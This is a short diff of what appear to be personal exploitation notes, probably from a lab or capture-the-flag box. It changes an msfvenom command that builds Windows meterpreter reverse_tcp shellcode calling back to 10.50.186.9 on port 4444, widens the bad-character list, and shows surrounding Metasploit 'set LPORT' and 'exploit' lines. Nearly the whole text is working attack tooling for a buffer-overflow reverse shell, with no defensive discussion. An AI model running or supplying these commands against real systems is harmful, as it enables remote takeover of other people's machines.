@@ -34,7 +34,7 @@ set LPORT 4444
 exploit
 
 #Shell code
-msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.186.9 lport 4444 -b "\x00" -f python
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.186.9 lport 4444 -b "\x00\xfe\x20\x0a\xff" -f python
 leave out first buf += "" line
 
 script:
